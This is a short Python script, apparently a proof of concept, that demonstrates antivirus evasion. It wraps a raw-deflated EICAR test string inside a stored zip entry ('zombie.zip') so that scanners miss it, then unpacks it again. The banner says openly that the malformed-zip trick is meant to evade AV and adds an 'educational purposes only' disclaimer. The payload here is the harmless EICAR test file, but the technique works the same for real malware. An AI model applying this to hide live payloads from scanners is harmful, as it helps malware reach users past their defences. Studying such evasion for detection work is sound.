import zipfile
import zlib


banner = """
⠀⠀⠀⠀⠀⠀⢀⣠⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣷⣶⣶⣦⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣤⣷⣿⣿⣿⣯⡉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣠⣾⣟⢿⢻⡝⣿⣿⣿⣿⣿⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   The malformed zip headers can be used to obfuscate content to AV.
⢿⠬⢾⣳⠗⢲⣿⣿⣿⡏⠻⠿⢿⣶⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   All you need is a custom script to compress and decompress it,
⠸⣷⣜⢐⡶⣿⣿⣿⣿⣿⣿⣷⣶⡞⠻⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀   which is then sufficient for AV evasion.
⢠⡿⠷⣿⣾⠿⣿⣿⣿⡿⠿⢿⣿⡟⠀⠀⠁⠉⠲⢄⡀⠀⠀⠀⠀
⠘⠀⠀⠈⠀⠀⠹⣿⣿⣧⠀⢸⣿⠃⠀⠀⠀⠀⠀⠀⠉⠒⢄⡀⠀   Disclaimer : This depos shows how this AV evasion.
⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣄⢻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠐   It has been developed for educational purposes only.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣇⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   I am not responsible for what you do with.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
payload = br"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

with zipfile.ZipFile("eicar_flag.zip", "w") as file:
    file.writestr("eicar",payload)


compressor = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS)
data = compressor.compress(payload) + compressor.flush()


with zipfile.ZipFile("zombie.zip", "w", compression=zipfile.ZIP_STORED) as zf:
    zf.writestr("eicar_legit",data)

with zipfile.ZipFile("zombie.zip", "r") as zb:    
    hex = zb.read(zb.namelist()[0])
    decompressor = zlib.decompressobj(-zlib.MAX_WBITS)
    data = decompressor.decompress(hex) + decompressor.flush()
    print(banner)
    print(f"You payload is: {data}")
